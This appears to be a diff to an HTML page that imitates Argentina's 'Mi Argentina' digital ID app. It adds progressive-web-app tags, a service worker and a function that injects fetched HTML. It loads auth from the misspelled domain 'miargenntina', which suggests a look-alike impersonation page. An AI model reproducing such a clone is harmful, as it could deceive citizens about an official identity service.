@@ -12,18 +12,42 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="description" content="Registrate para obtener tu DNI digital">
     <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-    <link rel="manifest" href="/manifest.json?v=2">
     <style>
       @import url(https://fonts.googleapis.com/css2?family=Lobster&display=swap);
       @import url(https://fonts.googleapis.com/css2?family=Alfa+Slab+One&display=swap);
     </style>
     <title>Mi Argentina</title>
     <script src="https://apis.google.com/_/scs/abc-static/_/js/k=gapi.lb.en.UrDN-rBnMgo.O/m=gapi_iframes/rt=j/sv=1/d=1/ed=1/rs=AHpOoo8Lt5m-Nn72_E0-4M58GbbhD_y7Yw/cb=gapi.loaded_0?le=scs" async=""></script>
-    <script defer="defer" src="/static/js/main.63990bba.js"></script>
     <link href="index.css" rel="stylesheet">
     <script src="https://apis.google.com/js/api.js?onload=__iframefcb740449" type="text/javascript" charset="UTF-8" gapi_processed="true"></script>
     <script src="https://www.googletagmanager.com/gtag/js?l=dataLayer&amp;id=G-M3GVWJJ11H" async=""></script>
+    
+    
+    <!-- Meta tags esenciales para iOS/Android -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="mobile-web-app-capable" content="yes">
+    
+    <!-- Íconos para iOS -->
+    <link rel="apple-touch-icon" href="imgs/logo-192x192.png">
+    <link rel="apple-touch-startup-image" href="imgs/splash.png">
+    
+    <!-- Manifest (obligatorio) -->
     <link rel="manifest" href="manifest.json">
+    <script src="sw.js"></script>
+
+    <!-- Color de la barra de estado en iOS -->
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+    <!-- Color de fondo mientras carga (splash screen improvisado) -->
+    <style>
+      @media (prefers-color-scheme: light) {
+        body {
+          background-color: #3630ba !important;
+        }
+      }
+</style>
   </head>
   <body>
     <noscript>You need to enable JavaScript to run this app.</noscript>
@@ -92,7 +116,7 @@
                     <span>Cobros</span>
                   </a>
                   <div class="Home_mistramitesContainer">
-                    <a class="Home_contentBtn" href="/editAccount">
+                    <a class="Home_contentBtn" href="tramites.html">
                       <img src="data:image/jpeg;base64,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" alt="mistramites">
                       <span>Trámites</span>
                     </a>
@@ -113,5 +137,26 @@
       </div>
     </div>
     <iframe ng-non-bindable="" frameborder="0" hspace="0" marginheight="0" marginwidth="0" scrolling="no" tabindex="-1" vspace="0" width="100%" aria-hidden="true" id="I0_1746123794489" name="I0_1746123794489" src="https://miargenntina.firebaseapp.com/__/auth/iframe?apiKey=AIzaSyCRHvG8mym2_-GHyEX9L-i6Dpk5Nb9QSMs&amp;appName=%5BDEFAULT%5D&amp;v=9.6.9&amp;eid=p&amp;usegapi=1&amp;jsh=m%3B%2F_%2Fscs%2Fabc-static%2F_%2Fjs%2Fk%3Dgapi.lb.en.UrDN-rBnMgo.O%2Fd%3D1%2Frs%3DAHpOoo8Lt5m-Nn72_E0-4M58GbbhD_y7Yw%2Fm%3D__features__#id=I0_1746123794489&amp;_gfid=I0_1746123794489&amp;parent=https%3A%2F%2Fdumpydumpy.com&amp;pfname=&amp;rpctoken=39092247" style="position: absolute; top: -100px; width: 1px; height: 1px;"></iframe>
+  
+    <script>
+      async function loadPageContent(url) {
+        const response = await fetch(url);
+        const html = await response.text();
+        document.getElementById('app').innerHTML = html;
+      }
+
+            // Registra el Service Worker
+      if ('serviceWorker' in navigator) {
+        window.addEventListener('load', () => {
+          navigator.serviceWorker.register('/sw.js')
+            .then(registration => {
+              console.log('SW registrado:', registration.scope);
+            })
+            .catch(err => {
+              console.log('Falló el registro:', err);
+            });
+        });
+      }
+    </script>
   </body>
 </html>
